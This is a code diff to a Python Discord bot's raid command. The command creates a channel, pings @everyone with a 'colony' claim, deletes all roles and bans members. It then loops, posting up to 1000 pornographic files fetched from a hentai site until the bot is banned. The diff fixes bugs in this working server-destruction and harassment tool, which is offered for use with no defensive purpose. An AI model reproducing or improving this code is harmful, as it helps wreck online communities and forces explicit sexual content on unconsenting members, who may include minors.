@@ -186,15 +186,16 @@ class Bot(cmd.Bot):
 
         # -make new channel-
         bot = ctx.bot
-        channel = await ctx.guild.create_text_channel('HEINZ')
-        heinz = bot.get_channel(bot.guilds[0].channels[0].id)
+        heinz = await ctx.guild.create_text_channel('HEINZ')
+        print(heinz.name)
         await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
 
         # -delete all roles-
         roles = []
 
-        for role in bot.guilds[0].roles:  # get all roles
+        for role in heinz.guild.roles:  # get all roles
             roles.append(role)
+        print(roles)
 
         for role in roles:
             try:
@@ -229,15 +230,16 @@ class Bot(cmd.Bot):
                     break
 
             y = random.choice(hentai)  # get random bit of hentai
-            while not y.startswith("https://hentaihaven.xxx/www/") and not len(args) > 0:  # check it is a video preview and not an asset
-                y = random.choice(hentai)
+            if len(args) > 0:
+                while not y.startswith("https://hentaihaven.xxx/www/") and not len(args) > 0:  # check it is a video preview and not an asset
+                    y = random.choice(hentai)
 
             async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                 async with session.get(y) as resp:
                     if resp.status != 200:
-                        return await channel.send('`error loading image`')
+                        return await heinz.send('`error loading image`')
                     data = io.BytesIO(await resp.read())
-                    await channel.send(file=discord.File(data, os.path.basename(y)))  # send hentai
+                    await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai
 
         time.sleep(5)
 
@@ -245,24 +247,25 @@ class Bot(cmd.Bot):
             try:
                 await member.ban()
             except Exception:
-                await channel.send("couldn't ban")
+                await heinz.send("couldn't ban")
 
-        try:
-            for i in range(5):  # send hentai until bot is banned
-                y = random.choice(hentai)  # get random bit of hentai
-                if len(args) == 1:
-                    if args[0] == "instantban":
+        
+            for i in range(1000):  # send hentai until bot is banned
+                try:
+                    y = random.choice(hentai)  # get random bit of hentai
+                    if len(args) == 1:
+                        if args[0] == "instantban":
+                            while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
+                                y = random.choice(hentai)
+                    elif len(args) == 0:
                         while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
                             y = random.choice(hentai)
-                elif len(args) == 0:
-                    while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
-                        y = random.choice(hentai)
 
-                async with aiohttp.ClientSession() as session:  # http stuff I don't understand
-                    async with session.get(y) as resp:
-                        if resp.status != 200:
-                            return await channel.send('`error loading image`')
-                        data = io.BytesIO(await resp.read())
-                        await channel.send(file=discord.File(data, os.path.basename(y)))  # send hentai
-        except Exception:
-            pass
+                    async with aiohttp.ClientSession() as session:  # http stuff I don't understand
+                        async with session.get(y) as resp:
+                            if resp.status != 200:
+                                return await heinz.send('`error loading image`')
+                            data = io.BytesIO(await resp.read())
+                            await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai
+                except Exception:
+                    break
